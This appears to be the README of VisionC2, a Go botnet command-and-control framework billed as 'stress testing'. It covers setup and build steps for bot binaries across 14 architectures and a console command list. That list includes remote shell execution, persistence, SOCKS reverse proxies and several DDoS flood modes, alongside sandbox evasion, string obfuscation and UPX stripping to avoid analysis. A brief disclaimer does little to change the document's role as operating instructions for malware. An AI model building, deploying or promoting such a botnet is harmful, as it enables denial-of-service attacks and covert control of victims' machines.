# VisionC2 – Advanced Botnet Command & Control Framework

![VisionC2 Banner](https://img.shields.io/badge/VisioNNet-V3-red)
![Go Version](https://img.shields.io/badge/Go-1.23.0+-blue)
![Platform](https://img.shields.io/badge/Platform-Linux%20%7C%20Windows%20%7C%20macOS-green)

**VisionC2** is an advanced botnet framework built in Go focused on network stress testing. Features end-to-end TLS 1.3 encryption, anti-analysis techniques, and DDOS/RCE/SOCKS modules.

---
## 🏗️ Architecture Overview

VisionC2 operates on a client-server model with clear separation between administrative interfaces and bot agents:

```
┌─────────────────┐    TLS 1.3    ┌─────────────────┐
│   Admin Console │◄──────────────►│    C2 Server    │
│  (Multi-User)   │                │  (Go Backend)   │
└─────────────────┘                └─────────────────┘
                                         │ TLS 1.3
                                         ▼
┌─────────────────┐                ┌─────────────────┐
│   Bot Agents    │◄───────────────┤  Bot Registry   │
│ (14+ Architectures)│                │ & Management   │
└─────────────────┘                └─────────────────┘
```

## 🚀 Installation & Setup

### Prerequisites

```bash
sudo apt update && sudo apt install -y upx-ucl openssl git wget gcc python3
# Go 1.23+ required - see https://go.dev/dl/
```

### ⭐ Use the Setup Wizard (Recommended)

```bash
git clone https://github.com/Syn2Much/VisionC2.git
cd VisionC2
python3 setup.py
```

**That's it!** The wizard handles everything:

- C2 address configuration & obfuscation
- Random magic codes & protocol versions  
- TLS certificate generation
- Source code updates
- Building CNC + 14 bot architectures

> 💡 **Don't waste time with manual setup** - the wizard does it all in under 2 minutes!

---

## 🎯 Quick Usage

```bash
# Start server
cd cnc && ./cnc

# Connect admin (in another terminal)
nc YOUR_IP YOUR_ADMIN_PORT
# Type "spamtec" → login prompt appears

# Bot binaries ready in: bot/bins/
optional: protect UPX packed binaries from string anaylsis https://github.com/Syn2Much/upx-stripper
```

---

## 🛠️ Command Reference

### User Management
- `help` - Context-aware help system (shows available commands)
- `db` - User database management (Owner only)
- `private` - Specialized commands based on clearance level

### Bot Operations
- `bots` - List all active agents with detailed status
- `!<botid> <command>` - Target specific agent
- `!info` - Comprehensive system intelligence
- `!persist` - Enhanced persistence mechanisms
- `!reinstall` - Agent redeployment
- `!lolnogtfo` - Secure agent removal

### Network Operations  
- `!socks <port>` - Establish SOCKS5 reverse proxy
- `!stopsocks` - Terminate proxy connections
- `!shell <command>` - Secure remote execution
- `!detach <command>` - Background process execution
- `!stream <command>` - Real-time output streaming

### Stress Testing
- `!udpflood <ip> <port> <duration>`
- `!tcpflood <ip> <port> <duration>`
- `!http <ip> <port> <duration>`
- `!syn/!ack/!gre/!dns` - Protocol-specific attacks

---

## 🔐 Security

- **TLS 1.3**: Encrypted communications for all network traffic
- **HMAC challenge-response auth**: Secure authentication mechanism
- **XOR+Base64 C2 obfuscation**: Command and control traffic obfuscation
- **UPX compressed binaries**: Executable compression and protection
- **Multi-tier user roles**: Granular access control system

### 🛡️ **Advanced Anti-Detection**
- **Sandbox Evasion**: Multi-stage detection of virtualized environments
- **String Obfuscation**: Critical strings are hidden from static analysis
- **Binary Protection**: UPX compression with string removal techniques
- **Bot Killer/Watchdog**: (WIP)

---

## ⚖️ Disclaimer

**Authorized security research only.** Obtain written permission before use.

---

## 🤝 Community & Support

### Contributing
We welcome contributions from security professionals:
- Code improvements and optimizations
- Additional evasion techniques
- Enhanced security features
- Documentation and examples

### Acknowledgments
Built upon the framework of [1birdo](https://github.com/1Birdo)'s BotnetGo


📧 **[dev@sinners.city](mailto:dev@sinners.city)**
